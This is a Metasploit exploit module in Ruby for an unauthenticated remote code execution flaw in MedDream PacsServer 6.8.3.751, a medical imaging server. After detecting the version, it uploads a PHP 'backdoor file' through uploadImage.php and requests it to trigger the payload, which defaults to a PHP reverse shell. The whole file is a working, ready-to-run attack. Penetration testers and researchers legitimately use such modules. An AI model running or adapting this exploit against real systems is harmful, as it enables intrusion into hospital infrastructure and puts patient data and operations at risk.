##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'MedDream PacsServer Unauthenticated RCE',
      'Description' => %q{
        This module exploits a vulnerability found in MedDream PacsServer 6.8.3.751,
        which allows unauthenticated attackers to perform Remote Code Execution
        via an arbitrary PHP file upload.
      },
      'License' => MSF_LICENSE,
      'Author' =>
        [
        'bzyo'
        ],
      'Platform' => 'php',
      'References' =>
          [
            ['EDB', '48868'],
          ],
      'Arch' => ARCH_PHP,
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultOptions' => {
        'PAYLOAD' => 'php/reverse_php',
      },
      'DisclosureDate' => 'Oct 10 2020',
      'DefaultTarget' => 0
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to attempt to application', '/Pacs/']),
        OptString.new('USERNAME', [false, 'The HTTP username to specify for authentication', '']),
        OptString.new('PASSWORD', [false, 'The HTTP password to specify for authentication', ''])
      ])
  end
  def check
    url = normalize_uri(target_uri.path, "login.php")
    res = send_request_cgi(
        'method'  => 'GET',
        'uri'     =>  url
    )


    if res.get_html_document.at('div[@id="footer"]').text.include? 'PACS-Premium 6.8.3'
      print_good('MedDream version 6.8.3 detected')
      return Exploit::CheckCode::Appears
    elsif res.get_html_document.at('div[@id="footer"]').text.include? 'PACS-Premium '
      print_status('MedDream detected, but not version 6.8.3')
      return Exploit::CheckCode::Detected
    end
  end

  def exploit
    filename = rand_text_alpha(8 + rand(4)) + '.php'
    dt =  DateTime::now
    date =  dt.strftime('%Y%m%d')
    time =  dt.strftime('%H%M%S')


    data = Rex::MIME::Message.new
    data.add_part('Attach', nil, nil, 'form-data; name="actionvalue"')
    data.add_part(payload.encoded,'application/octet-stream',nil, "form-data; name=\"uploadfile\"; filename=\"#{filename}\"")
    data.add_part('Attach', nil, nil, 'form-data; name="action"')

    print_status("Uploading backdoor file: #{filename}")
    fname = "#{date}-#{time}--#{filename}"
    print_status("New filename on system: '#{fname}")
    register_file_for_cleanup(fname)

    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, "uploadImage.php"),
      'ctype'    => "multipart/form-data;boundary=#{data.bound}",
      'data'     => data.to_s
     })

    print_status("Trigging the exploit...")
    send_request_cgi({
      'method'  => 'GET',
      'uri'     => normalize_uri(target_uri.path,"upload/" + fname)
     }, 5)
  end
end
